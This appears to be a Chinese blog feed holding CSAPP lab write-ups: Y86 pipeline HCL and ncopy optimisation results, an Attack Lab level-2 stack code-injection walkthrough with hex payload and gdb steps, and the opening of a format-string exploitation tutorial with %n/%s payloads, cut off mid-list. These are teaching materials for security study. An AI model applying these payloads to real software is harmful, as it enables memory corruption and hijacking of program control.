class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;<br>(E_dstM <span class="hljs-keyword">in</span> &#123;d_srcB&#125; || E_dstM == d_srcA &amp;&amp;!(D_icode <span class="hljs-keyword">in</span> &#123;IRMMOVQ,IPUSHQ&#125;)); <br>bool D_bubble =<br><span class="hljs-comment"># Mispredicted branch</span><br>(E_icode == IJXX &amp;&amp; !e_Cnd) ||<br><span class="hljs-comment"># Stalling at fetch while ret passes through pipeline</span><br><span class="hljs-comment"># but not condition for a load/use hazard</span><br>!(E_icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp; (E_dstM <span class="hljs-keyword">in</span> &#123;d_srcB&#125; || E_dstM == d_srcA &amp;&amp;!(D_icode <span class="hljs-keyword">in</span> &#123;IRMMOVQ,IPUSHQ&#125;))) &amp;&amp; <br>  IRET <span class="hljs-keyword">in</span> &#123; D_icode, E_icode, M_icode &#125;;<br><span class="hljs-comment"># Should I stall or inject a bubble into Pipeline Register E?</span><br><span class="hljs-comment"># At most one of these can be true.</span><br>bool E_stall = <span class="hljs-number">0</span>;<br>bool E_bubble =<br><span class="hljs-comment"># Mispredicted branch</span><br>(E_icode == IJXX &amp;&amp; !e_Cnd) ||<br><span class="hljs-comment"># Conditions for a load/use hazard</span><br>E_icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; &amp;&amp;<br>(E_dstM <span class="hljs-keyword">in</span> &#123;d_srcB&#125; || E_dstM == d_srcA &amp;&amp;!(D_icode <span class="hljs-keyword">in</span> &#123;IRMMOVQ,IPUSHQ&#125;)) ;<br><span class="hljs-comment"># Should I stall or inject a bubble into Pipeline Register M?</span><br><span class="hljs-comment"># At most one of these can be true.</span><br>bool M_stall = <span class="hljs-number">0</span>;<br><span class="hljs-comment"># Start injecting bubbles as soon as exception passes through memory stage</span><br>bool M_bubble = m_stat <span class="hljs-keyword">in</span> &#123; SADR, SINS, SHLT &#125; || W_stat <span class="hljs-keyword">in</span> &#123; SADR, SINS, SHLT &#125;;<br><span class="hljs-comment"># Should I stall or inject a bubble into Pipeline Register W?</span><br>bool W_stall = W_stat <span class="hljs-keyword">in</span> &#123; SADR, SINS, SHLT &#125;;<br>bool W_bubble = <span class="hljs-number">0</span>;<br><span class="hljs-comment">#/* $end pipe-all-hcl */</span><br></code></pre></td></tr></table></figure><p>贴上几个ncopy.ys：</p><ol><li>这个代码算是看的比较懂的一个，但是分数不算太高。<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Loop header</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jmp test<br>Loop:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    jle Loop1<br>    iaddq $1,%rax<br>Loop1:  <br>    andq %r9,%r9<br>    jle Loop2<br>    iaddq $1,%rax<br>Loop2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">24</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">24</span>(%rsi)<br>    jle Loop3<br>    iaddq $1,%rax<br>Loop3:  <br>    andq %r9,%r9<br>    jle Loop4<br>    iaddq $1,%rax<br>Loop4:<br>    mrmovq <span class="hljs-number">32</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">40</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">32</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">40</span>(%rsi)<br>    jle Loop5<br>    iaddq $1,%rax<br>Loop5:<br>    iaddq $48,%rdi<br>    iaddq $48,%rsi      <br>    andq %r9,%r9<br>    jle test<br>    iaddq $1,%rax<br>test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br><br>L:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle L1<br>    iaddq $1,%rax<br>L1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    jle L2<br>    iaddq $1,%rax<br>L2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    iaddq $24,%rdi<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    iaddq $24,%rsi<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $-<span class="hljs-number">3</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够3个</span><br>    jge L<br>    iaddq $2, %rdx          <span class="hljs-comment"># -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br>    je R<span class="hljs-number">0</span><br>    jl Done<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle R2<br>    iaddq $1,%rax<br>R2:<br>    andq %r9,%r9<br>    jle Done<br>    iaddq $1,%rax<br>    jmp Done<br>R<span class="hljs-number">0</span>:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle Done<br>    iaddq $1,%rax<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE<span class="hljs-number">8</span>.<span class="hljs-number">15</span><br><span class="hljs-attribute">Score</span><span class="hljs-number">46</span>.<span class="hljs-number">9</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><ol start="2"><li>这个代码分数略高一些，但是我理解起来差了一些。我在此基础上再做一些改进。大体思路为：</li></ol><ul><li><p>循环展开主要是并行的读取相邻元素, 降低循环的次数, 从而减少了循环变量计算和比较的次数.这个写法大概是8路展开？</p></li><li><p>指令重拍也是为了提升指令并行执行的数量, 比如我们想将rdi的内容拷贝到rsi中, 很自然的可以写 mrmovq (%rdi), %r10 和 rmmovq %r10, (%rsi), 但这两条指令是有依赖的, 后面需要上一条指令将%10写入后才能开始. 我们在循环展开的条件下, 可以在中间再插入一条读取指令 mrmovq 8(%rdi), %11 有效避免了依赖造成的时钟浪费.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># You can modify this portion</span><br><span class="hljs-comment"># Loop header</span><br>xorq %rax,%rax<span class="hljs-comment"># count = 0;</span><br>iaddq $-<span class="hljs-number">3</span>, %rdx<br>jle BeforeTail<span class="hljs-comment"># len &lt;= 0? if so, goto Tail:</span><br>Extended4Loop:<br>mrmov<span class="hljs-string">q (%rdi)</span>, %r9 <span class="hljs-comment"># read val1 from src...</span><br>mrmovq <span class="hljs-number">8</span>(%rdi), %r10 <span class="hljs-comment"># read val2 from src...</span><br>mrmovq <span class="hljs-number">16</span>(%rdi), %r11 <span class="hljs-comment"># read val3 from src...</span><br>mrmovq <span class="hljs-number">24</span>(%rdi), %r12 <span class="hljs-comment"># read val4 from src...</span><br>rmmovq %r9, (%rsi)<span class="hljs-comment"># store val to dst</span><br>rmmovq %r10, <span class="hljs-number">8</span>(%rsi)<span class="hljs-comment"># store val to dst</span><br>rmmovq %r11, <span class="hljs-number">16</span>(%rsi)<span class="hljs-comment"># store val to dst</span><br>rmmovq %r12, <span class="hljs-number">24</span>(%rsi)<span class="hljs-comment"># store val to dst</span><br>andq %r9, %r9<span class="hljs-comment"># val1 &lt;= 0?</span><br>jle Npos2<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos2:<br>andq %r10, %r10<span class="hljs-comment"># val2 &lt;= 0?</span><br>jle Npos3<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos3:<br>andq %r11, %r11<span class="hljs-comment"># val3 &lt;= 0?</span><br>jle Npos4<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos4:<br>andq %r12, %r12<span class="hljs-comment"># val4 &lt;= 0?</span><br>jle Npos5<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos5:<br>iaddq $32, %rdi<span class="hljs-comment"># src+=4</span><br>iaddq $32, %rsi<span class="hljs-comment"># dst+=4</span><br>iaddq $-<span class="hljs-number">4</span>, %rdx<span class="hljs-comment"># len-=4</span><br>jg Extended4Loop<br>BeforeTail:<br>iaddq $3, %rdx<br>jle Done<span class="hljs-comment">#  if so, goto Done:</span><br>mrmov<span class="hljs-string">q (%rdi)</span>, %r9 <span class="hljs-comment"># read val from src...</span><br>mrmovq <span class="hljs-number">8</span>(%rdi), %r10 <span class="hljs-comment"># read val from src...</span><br>rmmovq %r9, (%rsi)<span class="hljs-comment"># store val to dst</span><br>andq %r9, %r9<span class="hljs-comment"># val &lt;= 0?</span><br>jle Npos6<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos6:<br>iaddq $-<span class="hljs-number">1</span>, %rdx<span class="hljs-comment"># len--</span><br>jle Done<span class="hljs-comment"># if so, goto Done:</span><br>rmmovq %r10, <span class="hljs-number">8</span>(%rsi)<span class="hljs-comment"># store val to dst</span><br>andq %r10, %r10<span class="hljs-comment"># val &lt;= 0?</span><br>jle Npos7<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br>Npos7:<br>iaddq $-<span class="hljs-number">1</span>, %rdx<span class="hljs-comment"># len--</span><br>jle Done<span class="hljs-comment"># if so, goto Done:</span><br>mrmovq <span class="hljs-number">16</span>(%rdi), %r11 <span class="hljs-comment"># read val from src...</span><br>rmmovq %r11, <span class="hljs-number">16</span>(%rsi)<span class="hljs-comment"># store val to dst</span><br>andq %r11, %r11<span class="hljs-comment"># val &lt;= 0?</span><br>jle Done<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq $1, %rax<span class="hljs-comment"># count++</span><br><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE<span class="hljs-number">8</span>.<span class="hljs-number">06</span><br><span class="hljs-attribute">Score</span><span class="hljs-number">48</span>.<span class="hljs-number">9</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>分数为48.9，在此基础上我又将</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">xorq <span class="hljs-meta">%</span>rax,<span class="hljs-meta">%</span>rax<span class="hljs-attr"># count = 0</span>;<br></code></pre></td></tr></table></figure><p>这一行注释掉，分数提高到了50.04。</p><p><strong>记录一些报错</strong></p><p>在进行测试的时候有个问题，无论咋修改，执行.&#x2F;correctness.pl 指令后都是OK，而执行.&#x2F;benchmark.pl后可以看到benchmark全是16 18很小的数字（网上大佬的都六七百。。），而且最终分数都是满分，这铁定不对啊，在这里卡了很久。<br><img src="/images/arch-4.png"></p><p>直到执行了如下几个命令,大致意思是使用 make VERSION&#x3D;full 编译, 然后使用 psim(并行执行指令模拟器)跑样例 sdriver.yo ldriver.yo 来测试我们的实现是否正确：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>pipe$ make drivers<br>./gen-driver.pl -n <span class="hljs-number">4</span> -f ncopy.ys &gt; sdriver.ys<br>..<span class="hljs-regexp">/misc/y</span>as sdriver.ys<br>./gen-driver.pl -n <span class="hljs-number">63</span> -f ncopy.ys &gt; ldriver.ys<br>..<span class="hljs-regexp">/misc/y</span>as ldriver.ys<br>fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>pipe$ make psim VERSION=full<br><span class="hljs-comment"># Building the pipe-full.hcl version of PIPE</span><br>..<span class="hljs-regexp">/misc/</span>hcl2c -n pipe-full.hcl &lt; pipe-full.hcl &gt; pipe-full.c<br>gcc -Wall -O2 -fcommon  -I../misc  -o psim psim.c pipe-full.c \<br>..<span class="hljs-regexp">/misc/i</span>sa.c  -lm<br>fuzz@ubuntu:~<span class="hljs-regexp">/Architecture Lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>pipe$ make VERSION=full<br>./gen-driver.pl -n <span class="hljs-number">4</span> -f ncopy.ys &gt; sdriver.ys<br>..<span class="hljs-regexp">/misc/y</span>as sdriver.ys<br>./gen-driver.pl -n <span class="hljs-number">63</span> -f ncopy.ys &gt; ldriver.ys<br>..<span class="hljs-regexp">/misc/y</span>as ldriver.ys<br><br></code></pre></td></tr></table></figure><p>之后再执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./correctness.pl<br>./benchmark.pl<br></code></pre></td></tr></table></figure><p>就能出现正确分数啦！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP——AttackLab</title>
    <link href="/2023/09/30/CSAPP%E2%80%94%E2%80%94AttackLab/"/>
    <url>/2023/09/30/CSAPP%E2%80%94%E2%80%94AttackLab/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="x86-64架构-64bit"><a href="#x86-64架构-64bit" class="headerlink" title="x86_64架构(64bit)"></a>x86_64架构(64bit)</h3><p><strong>通用寄存器</strong></p><ul><li>rax：通常用于存储函数调用返回值</li><li>rsp：栈顶指针，指向栈的顶部</li><li>rdi：第一个入参</li><li>rsi：第二个入参</li><li>rdx：第三个入参</li><li>rcx：第四个入参</li><li>r8：第五个入参</li><li>r9：第六个入参</li><li>rbx：数据存储，遵循Callee Save原则</li><li>rbp：数据存储，遵循Callee Save原则</li><li>r12~r15：数据存储，遵循Callee Save原则</li><li>r10~r11：数据存储，遵循Caller Save原则</li></ul><h2 id="Part-I"><a href="#Part-I" class="headerlink" title="Part I"></a>Part I</h2><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>任务：使得ctarget在执行了getbuf函数之后继续执行touch2函数,而不是返回test函数. 注意要给touch2传参数(cookie).</p><p>具体解题思路如下：</p><ul><li>将正常的返回地址设置成为注入代码的地址，这次注入直接在栈顶注入，即设置为%rsp</li><li>cookie的值写在%rdi里 （在cookie.txt中）</li><li>获取touch2的首地址，这个已经有了</li><li>要调用touch2，却不能用call jmp等命令，所以只能用ret弹出，在弹出之前要先把touch2地址压栈。</li></ul><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>创建phase2.s文件，写入汇编语言：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">movq    $0x59b997fa, %rdi   <span class="hljs-comment">#cookie的值写在%rdi里</span><br>pushq   $0x4017ec           <span class="hljs-comment">#touch2的地址</span><br>ret<br></code></pre></td></tr></table></figure><p>之后编译文件，查看反汇编</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>gcc -c phase2<span class="hljs-selector-class">.s</span><br>objdump -d phase2<span class="hljs-selector-class">.o</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/attack-1.png"></p><p>可以看到这三条指令地址我们就得到了。<br>之后再去找rsp在哪里，借助gdb：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">(gdb) <span class="hljs-keyword">break</span> *<span class="hljs-number">0</span>x4017ac    <br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0</span>x4017ac: file buf.c, line <span class="hljs-number">14</span>.<br>(gdb) run -q<br>Starting program: <span class="hljs-regexp">/home/</span>leyn<span class="hljs-regexp">/csapplab/</span>target1/ctarget -q<br>Cookie: <span class="hljs-number">0</span>x59b997fa<br><br>Breakpoint <span class="hljs-number">1</span>, getbuf () at buf.c:<span class="hljs-number">14</span><br><span class="hljs-number">14</span>buf.c: 没有那个文件或目录.<br>(gdb) info registers<br>... <span class="hljs-regexp">//</span>省略<br>rsp            <span class="hljs-number">0</span>x5561dc78<span class="hljs-number">0</span>x5561dc78<br>... <span class="hljs-regexp">//</span>省略<br></code></pre></td></tr></table></figure><p>这里起初我将断点设置在getbuf处，即b getbuf<br>之后运行直接info registers<br>这样得到的rsp的值是错误的，需要利用指令n 步过几步之后再查看，</p><p><img src="/images/attack-2.png"></p><p>这样rsp的值也知道了是0x5561dc78。</p><p>创建一个phase2.txt文件，将最终的代码写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure><p>最终运行结果：</p><p><img src="/images/attack-3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——格式化字符串漏洞初尝试</title>
    <link href="/2023/09/21/Pwn%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/09/21/Pwn%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞基础"><a href="#格式化字符串漏洞基础" class="headerlink" title="格式化字符串漏洞基础"></a>格式化字符串漏洞基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：printf(“%s”, pad)，偷懒写成了：printf(pad)，此时就存在格式化字符串漏洞。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><ul><li>通过输入字符串计算偏移量</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">32</span>位<br><br>aaaa <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span>...<br><br><span class="hljs-number">64</span>位<br><br>aaaaaaaa <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span>...<br></code></pre></td></tr></table></figure><p><img src="/images/pwn9-1.png"></p><p>如图所示偏移量应该为11.</p><ul><li>利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。</li></ul><p><strong>找到的偏移如何用？</strong><br>例如，以32位程序为例，构造payload：p32(system_got)+b”%11$s”，此时system的got表地址会存在栈上，也就是printf的第11个参数位置；而%11$s表示打印出第11个参数作为地址指向的内容，所以此时该payload就会打印出system的真实地址。再构造payload：p32(system_got)+b”%11$n”，%11$n表示往第11个参数指向的内存中写4个字节宽的内容，而写的数值是print已经打印的内容长度，printf此时打印的长度是p32(system_got)的长度，也就是4，所以此时该payload就会改写system真实地址为4。</p><h3 id="常用payload总结-还不能完全理解，先放在这里，边刷题边理解吧"><a href="#常用payload总结-还不能完全理解，先放在这里，边刷题边理解吧" class="headerlink" title="常用payload总结(还不能完全理解，先放在这里，边刷题边理解吧)"></a>常用payload总结(还不能完全理解，先放在这里，边刷题边理解吧)</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br># 格式化符号说明<br>%x 以十六进制打印，只能打印<span class="hljs-number">4</span>字节，一般只用于<span class="hljs-number">32</span>位<br>%p 打印目标地址，建议<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位都用这个<br>%s 打印地址内容<br>%c 打印单个字符<br>%hhn 写一字节<br>%hn  写两字节<br>%n   写四字节<br>%ln  <span class="hljs-number">32</span>位写四字节，<span class="hljs-number">64</span>位写八字节<br>%lln 写八字节<br><br>#################### <span class="hljs-number">32</span>位<br># 求偏移<br>pad = <span class="hljs-string">&quot;aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...&quot;</span><br><br># 